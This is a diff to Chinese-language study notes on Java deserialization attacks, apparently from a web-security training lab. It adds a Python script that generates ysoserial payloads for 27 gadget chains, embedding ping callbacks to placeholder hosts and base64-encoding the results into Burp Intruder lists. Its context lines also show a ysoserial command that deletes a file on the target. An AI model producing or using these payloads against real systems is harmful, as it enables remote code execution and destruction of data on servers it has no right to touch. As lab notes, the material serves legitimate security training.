@@ -77,3 +77,25 @@ java -jar ysoserial-all.jar \
 java15及以下：
 java -jar ysoserial-all.jar CommonsCollections4 "rm /home/carlos/morole.txt" | base64
 ```
+
+脚本:
+```python
+import os
+import base64
+
+# You may need to update the payloads
+payloads = ['BeanShell1', 'Clojure', 'CommonsBeanutils1', 'CommonsCollections1', 'CommonsCollections2', 'CommonsCollections3', 'CommonsCollections4', 'CommonsCollections5', 'CommonsCollections6', 'CommonsCollections7', 'Groovy1', 'Hibernate1', 'Hibernate2', 'JBossInterceptors1', 'JRMPClient', 'JSON1', 'JavassistWeld1', 'Jdk7u21', 'MozillaRhino1', 'MozillaRhino2', 'Myfaces1', 'Myfaces2', 'ROME', 'Spring1', 'Spring2', 'Vaadin1', 'Wicket1']
+def generate(name, cmd):
+    for payload in payloads:
+        final = cmd.replace('REPLACE', payload)
+        print 'Generating ' + payload + ' for ' + name + '...'
+        command = os.popen('java -jar ysoserial.jar ' + payload + ' "' + final + '"')
+        result = command.read()
+        command.close()
+        encoded = base64.b64encode(result)
+        if encoded != "":
+            open(name + '_intruder.txt', 'a').write(encoded + '\n')
+
+generate('Windows', 'ping -n 1 win.REPLACE.server.local')
+generate('Linux', 'ping -c 1 nix.REPLACE.server.local')
+```
